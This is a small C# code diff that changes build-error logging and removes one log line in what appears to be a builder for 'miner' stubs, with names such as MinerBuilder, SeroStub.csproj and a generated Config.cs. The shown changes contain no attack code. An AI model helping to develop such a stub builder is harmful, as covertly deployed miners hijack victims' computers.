@@ -3253,7 +3253,14 @@ internal static class MinerConfig
             if (proc.ExitCode != 0)
             {
                 Log($"[!] MinerBuilder: Build failed (exit {proc.ExitCode})");
-                if (!string.IsNullOrWhiteSpace(stderr)) Log(stderr);
+                foreach (var line in stderr.Split('\n'))
+                {
+                    var l = line.Trim();
+                    if (l.Length > 0 && (l.Contains("error", StringComparison.OrdinalIgnoreCase) ||
+                                         l.Contains("warning", StringComparison.OrdinalIgnoreCase) ||
+                                         l.Contains("FAILED", StringComparison.OrdinalIgnoreCase)))
+                        Log("[!] " + l);
+                }
                 TxtMnrBuildStatus.Text = Lang.Get("BLD_STATUS_FAILED");
                 return;
             }
@@ -3775,7 +3782,6 @@ Read-Host 'Press Enter to close'
         {
             var configPath = Path.Combine(stubDir, "Config.cs");
             await File.WriteAllTextAsync(configPath, GenerateConfigCs());
-            Log("[+] Builder: Config.cs generated.");
 
             var csprojPath = Path.Combine(stubDir, "SeroStub.csproj");
             var csproj = await File.ReadAllTextAsync(csprojPath);
